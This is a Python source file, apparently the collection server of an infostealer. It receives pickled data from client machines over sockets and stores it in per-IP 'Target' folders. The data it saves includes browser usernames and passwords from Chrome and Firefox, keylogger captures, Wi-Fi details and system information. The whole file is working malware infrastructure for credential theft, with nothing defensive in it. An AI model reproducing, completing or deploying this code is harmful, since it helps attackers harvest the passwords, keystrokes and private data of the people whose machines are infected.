import os
import pickle
import csv
import json

def create_target_directory(target_dir, ip_client):
    ip_directory = os.path.join(target_dir, ip_client)
    if not os.path.exists(ip_directory):
        os.makedirs(ip_directory)
        print(f"Directory '{ip_directory}' created successfully.")
    else:
        print(f"Directory '{ip_directory}' already exists.")
    return ip_directory

def receive_file(conn, filename):
    """Reçoit un fichier du client et le sauvegarde localement."""
    with open(filename, 'wb') as f:
            chunk = conn.recv(1024) 
            if not chunk:
                print("no chunk")
            f.write(chunk)
    return


def receive_data_firefox(conn, filename):
    print(filename)

    received_data = b''
    while True:
        chunk = conn.recv(1024)  
        if not chunk:
            break
        received_data += chunk
    
    deserialized_data = pickle.loads(received_data)
    print(deserialized_data)
    
    with open(filename, 'w', newline='') as f:  
        writer = csv.writer(f)
        writer.writerow(['url', 'user', 'password'])  
        for item in deserialized_data:
            writer.writerow([item['url'], item['user'], item['password']])
    return


def receive_data_naviguator(conn, csv_filename, file_filename):
    received_data = b''
    while True:
        chunk = conn.recv(1024)
        if not chunk:
            break
        received_data += chunk
    data = pickle.loads(received_data)

    with open(file_filename, 'w') as file:
        file.write(data['file_contents'])

    with open(csv_filename, 'w', newline='') as csvfile:
        fieldnames = ['Chrome', 'Firefox']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        max_length = max(len(data['chrome_data']), len(data['firefox_data']))

        for i in range(max_length):
            chrome_entry = data['chrome_data'][i] if i < len(data['chrome_data']) else None
            firefox_entry = data['firefox_data'][i] if i < len(data['firefox_data']) else None

            writer.writerow({
                'Chrome': chrome_entry,
                'Firefox': firefox_entry
            })

def receive_all_data(conn, keylogger_file, password_filename , wifi_file,filename_device):
    received_data = b''
    while True:
        chunk = conn.recv(1024)
        if not chunk:
            break
        received_data += chunk
    data = pickle.loads(received_data)

    with open(password_filename, 'w') as file:
        file.write(data['keylogger'])

    with open(wifi_file, 'w') as file:
        file.write(data['wifi'])

    with open(filename_device, 'w') as file:
        json.dump(data['system_info'], file, indent=4)



    with open(keylogger_file, 'w', newline='') as csvfile:
        fieldnames = ['Chrome', 'Firefox']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        max_length = max(len(data['chrome_data']), len(data['firefox_data']))

        for i in range(max_length):
            chrome_entry = data['chrome_data'][i] if i < len(data['chrome_data']) else None
            firefox_entry = data['firefox_data'][i] if i < len(data['firefox_data']) else None

            writer.writerow({
                'Chrome': chrome_entry,
                'Firefox': firefox_entry
            })


def print_directory_tree(root_dir, indent=''):
    """
    Affiche l'arborescence du répertoire à partir de root_dir.
    """
    if os.path.isdir(root_dir):
        print(indent + os.path.basename(root_dir) + '/')
        indent += '  '
        for item in os.listdir(root_dir):
            print_directory_tree(os.path.join(root_dir, item), indent)
    else:
        print(indent + os.path.basename(root_dir))
        

def read_file_in_target(filename):
    """
    Lit le contenu du fichier situé dans le répertoire 'Target'.
    """
    target_dir = 'Target'
    filepath = os.path.join(target_dir, filename)
    if os.path.isfile(filepath):
        with open(filepath, 'r') as file:
            content = file.read()
        return content
    else:
        return f"The file named '{filename}' dont exist in the folder Target "